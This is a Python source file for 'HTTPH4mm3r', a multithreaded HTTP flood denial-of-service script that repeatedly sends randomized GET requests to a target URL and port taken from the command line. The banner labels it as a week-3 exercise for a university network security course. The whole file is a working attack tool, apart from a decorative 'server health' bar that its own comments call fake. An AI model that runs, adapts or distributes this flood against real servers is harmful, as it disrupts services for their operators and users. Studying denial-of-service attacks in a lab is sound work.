import socket
import threading
import argparse
import os
import random
import time
from urlparse import urlparse

# Global variables 
TARGET_URL = ""  # Global variable to store the full URL
TARGET_HOST = "" # Global variable to store the hostname
TARGET_PORT = 80  # Global variable to store the port
request_counter = 0  # Counter to track number of requests sent
 

def display_ascii_art():
    ascii_art = """
\033[95m\033[1m
  _   _ _____ _____ ____  _   _ _  _                       _____      
 | | | |_   _|_   _|  _ \| | | | || |  _ __ ___  _ __ ___ |___ / _ __ 
 | |_| | | |   | | | |_) | |_| | || |_| '_ ` _ \| '_ ` _ \  |_ \| '__|
 |  _  | | |   | | |  __/|  _  |__   _| | | | | | | | | | |___) | |   
 |_| |_| |_|   |_| |_|   |_| |_|  |_| |_| |_| |_|_| |_| |_|____/|_|   
\033[0m
"""
    print(ascii_art)
    print("\033[1;34mCOMP1829-  Network Security\033[0m")
    print("\033[1;32mDenial of Service Week3\033[0m\n") 


# Function to send HTTP requests
def http_flood(delay):
    global request_counter
    # Variables to store the User-Agent
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
            s.connect((TARGET_HOST, TARGET_PORT)) # Connect to the server
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")) # Send GET request
            s.send("User-Agent: {}\r\n".format(USER_AGENT).encode("utf-8")) # Send User-Agent header
            s.send(b"\r\n") # End of headers
            s.recv(1024) # Receive data (1024 bytes)
            request_counter += 1 
            s.close()
            time.sleep(delay)  # Add delay between requests
        except socket.error:
            continue

# Fake function to display the server health
def display_server_health(health):
    os.system('clear')
    display_ascii_art() 
    print("\033[1mTarget URL: {}\033[0m".format(TARGET_URL))  # Display the full URL
    print("\033[1mTotal Requests Sent: {}\033[0m".format(request_counter))
    print("\n\033[1m      SERVER HEALTH")
    print("---------------------------\033[0m")

    if health > 75:
        color = "\033[32m\033[1m"  # Green color
    elif 50 < health <= 75:
        color = "\033[33m\033[1m" # Yellow color
    else:
        color = "\033[31m\033[1m" # Red color

    # Display the fake health bar
    bar_length = int(health / 5)
    print(color + "|" + "=" * bar_length + " " * (20 - bar_length) + "| " + str(health) + "%\033[0m")
    print("\nPress Ctrl+C to stop the attack.")

    if health == 5:
        for _ in range(5):
            os.system('clear')
            print("\033[31m\033[1mBOOM!\033[0m")
            time.sleep(0.2)
            os.system('clear')
            time.sleep(0.2)
            
            
def main():
    global TARGET_HOST, TARGET_PORT, TARGET_URL 
    
    # Parse the command line arguments
    parser = argparse.ArgumentParser(description="HTTPH4mm3r - HTTP Flood Script")
    parser.add_argument('-c', '--concurrent', type=int, default=2, help="Number of concurrent requests.")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL for the attack.")
    parser.add_argument('-p', '--port', type=int, default=80, help="Port of the target server.")
    parser.add_argument('-d', '--delay', type=float, default=0, help="Delay between requests for each thread (in seconds).")
    args = parser.parse_args()

    parsed_url = urlparse(args.url)  # Parse the provided URL
    TARGET_URL = args.url  # Store the full URL
    TARGET_HOST = parsed_url.hostname  # Extract the hostname
    TARGET_PORT = args.port

    display_ascii_art()

    try:
        threads = []
        for _ in range(args.concurrent): # Create the threads
            t = threading.Thread(target=http_flood, args=(args.delay,)) # Create a thread for each request
            t.daemon = True  # Set thread as a daemon thread so it can be stopped easily using Ctrl+C
            t.start() 
            threads.append(t)

        while any(t.is_alive() for t in threads):
            health = 100 - (request_counter // 1000)
            health = max(health, 5)
            display_server_health(health)

            if health <= 5:
                print("Server health critical. Stopping...")
                break
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nStopping attack...")


if __name__ == "__main__":
    main()
    
